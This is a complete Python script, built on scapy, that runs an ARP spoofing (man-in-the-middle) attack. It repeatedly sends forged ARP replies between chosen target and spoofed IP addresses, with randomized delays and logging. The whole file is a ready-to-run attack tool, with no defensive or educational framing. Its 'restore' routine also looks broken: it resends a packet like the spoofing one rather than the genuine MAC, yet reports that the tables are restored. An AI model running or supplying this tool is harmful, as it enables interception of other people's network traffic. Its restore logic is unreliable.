import scapy.all as scapy
import time
import random
import logging
import argparse
import ipaddress

# Configure logging
logging.basicConfig(filename='arp_spoof.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_mac(ip):
    try:
        # Craft an ARP request packet to get the MAC address of the target IP
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request

        # Send the ARP request packet and receive the response
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        # Extract and return the MAC address from the response
        if len(answered_list) > 0:
            return answered_list[0][1].hwsrc
        else:
            logging.error("Failed to get MAC address for IP: %s", ip)
            return None
    except Exception as e:
        logging.error("An error occurred while getting MAC address: %s", str(e))
        return None

def spoof(target_ip, spoof_ip):
    try:
        # Retrieve the MAC address of the target IP
        target_mac = get_mac(target_ip)
        if target_mac:
            # Craft an ARP response packet with the spoofed IP and target MAC
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

            # Send the spoofed ARP response packet
            scapy.send(packet, verbose=False)
            logging.info("Spoofed ARP packet sent: Target IP: %s, Spoofed IP: %s", target_ip, spoof_ip)
        else:
            logging.error("Failed to spoof ARP packet: Unable to get target MAC address for IP: %s", target_ip)
    except Exception as e:
        logging.error("An error occurred while spoofing ARP packet: %s", str(e))

def restore(target_ip, spoof_ip):
    try:
        # Retrieve the original MAC address of the target IP
        target_mac = get_mac(target_ip)
        if target_mac:
            # Craft an ARP response packet with the original IP and MAC
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

            # Send the original ARP response packet to restore the ARP table
            scapy.send(packet, verbose=False)
            logging.info("ARP table restored for IP: %s", target_ip)
        else:
            logging.error("Failed to restore ARP table: Unable to get target MAC address for IP: %s", target_ip)
    except Exception as e:
        logging.error("An error occurred while restoring ARP table: %s", str(e))

def parse_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--targets", metavar="target_ip", nargs="+", required=True, help="Target IP addresses")
    parser.add_argument("-s", "--spoofs", metavar="spoof_ip", nargs="+", required=True, help="Spoofed IP addresses")
    return parser.parse_args()

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

args = parse_arguments()

target_ips = args.targets
spoof_ips = args.spoofs

# Validate IP addresses
for ip in target_ips + spoof_ips:
    if not validate_ip(ip):
        print(f"Invalid IP address: {ip}")
        exit()

try:
    while True:
        for target_ip, spoof_ip in zip(target_ips, spoof_ips):
            # Perform ARP spoofing between target IP and spoofed IP
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)

            # Randomized delay between spoofing packets
            delay = random.randint(1, 5)
            logging.info("Delaying for %s seconds before sending next ARP packet.", delay)
            time.sleep(delay)

except KeyboardInterrupt:
    # Restore the ARP tables on exit
    print("\n[!] Keyboard interrupt detected. Restoring ARP tables...")
    logging.info("Keyboard interrupt detected. Restoring ARP tables...")
    for target_ip, spoof_ip in zip(target_ips, spoof_ips):
        restore(target_ip, spoof_ip)
    print("[+] ARP tables restored.")
    logging.info("ARP tables restored successfully.")
